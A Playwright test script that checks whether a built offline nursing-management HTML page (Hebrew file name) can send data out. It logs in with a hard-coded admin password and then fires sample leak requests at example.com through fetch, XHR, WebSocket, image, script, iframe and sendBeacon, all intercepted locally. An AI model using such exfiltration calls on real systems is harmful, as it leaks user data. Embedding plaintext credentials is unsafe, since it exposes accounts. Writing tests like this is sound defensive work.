// Verifies that the built page cannot send anything out: every network channel is
// attempted from inside the page and must be blocked by the browser, and the page
// must make no network requests of its own while used.
// Usage: node tests/security-check.js
const { chromium } = require('playwright');
const path = require('path');
const FILE = path.resolve(__dirname, '../dist/מערכת_ניהול_סיעוד_ניסיון.html');
(async () => {
  const b = await chromium.launch();
  const p = await (await b.newContext()).newPage();
  const requests = [], outcomes = [];
  const ext = (u) => !/^(file|data|blob|about):/.test(u);
  p.on('request', (r) => { if (ext(r.url())) requests.push(r.url()); });
  p.on('requestfailed', (r) => { if (ext(r.url())) outcomes.push([r.url(), r.failure() && r.failure().errorText]); });
  p.on('requestfinished', (r) => { if (ext(r.url())) outcomes.push([r.url(), 'SENT']); });
  // nothing may actually leave: any request that the browser lets through is answered locally and recorded
  await p.route(/^https?:/, (route) => { outcomes.push([route.request().url(), 'SENT']); route.fulfill({ status: 204, body: '' }); });
  await p.goto('file://' + FILE);
  await p.waitForSelector('#login-form', { timeout: 20000 });
  await p.fill('#li-user', 'admin'); await p.fill('#li-pass', 'Nihul2026!');
  await p.click('#login-form button[type=submit]');
  await p.waitForSelector('#side');
  for (const n of ['עובדים', 'גיליונות הנהלת הסיעוד', 'הפקת דוחות', 'משתמשים והרשאות']) { await p.click(`#side >> text=${n}`); await p.waitForTimeout(300); }
  const appRequests = requests.length;
  const r = await p.evaluate(async () => {
    const out = {};
    const t = async (name, fn) => { try { await fn(); out[name] = 'NOT BLOCKED'; } catch (e) { out[name] = 'blocked'; } };
    await t('fetch', () => fetch('https://example.com/leak?x=1'));
    await t('XMLHttpRequest', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('POST', 'https://example.com/leak'); x.onload = res; x.onerror = rej; x.send('x'); }));
    await t('WebSocket', () => new Promise((res, rej) => { try { const w = new WebSocket('wss://example.com/'); w.onopen = res; w.onerror = rej; } catch (e) { rej(e); } }));
    await t('image', () => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = 'https://example.com/pixel.png'; }));
    await t('script', () => new Promise((res, rej) => { const s = document.createElement('script'); s.onload = res; s.onerror = rej; s.src = 'https://example.com/x.js'; document.head.appendChild(s); }));
    const f = document.createElement('iframe'); f.src = 'https://example.com/frame'; document.body.appendChild(f);
    navigator.sendBeacon('https://example.com/beacon', 'x');
    await new Promise((r2) => setTimeout(r2, 2000));
    return out;
  });
  await p.waitForTimeout(1500);
  const leaked = [...new Set(outcomes.filter(([, o]) => o === 'SENT').map(([u]) => u))];
  for (const u of ['https://example.com/frame', 'https://example.com/beacon']) r[u.split('/').pop()] = leaked.includes(u) ? 'NOT BLOCKED' : 'blocked';
  console.log('app made network requests while used:', appRequests === 0 ? 'none' : requests);
  console.log('browser outcome of every attempt:', JSON.stringify([...new Map(outcomes).entries()]));
  for (const [k, v] of Object.entries(r)) console.log(`${v === 'blocked' ? 'PASS' : 'FAIL'} ${k}: ${v}`);
  console.log(leaked.length ? `FAIL requests reached the network: ${leaked.join(', ')}` : 'PASS no request left the browser');
  await b.close();
  process.exit(appRequests || leaked.length || Object.values(r).some((v) => v !== 'blocked') ? 1 : 0);
})();
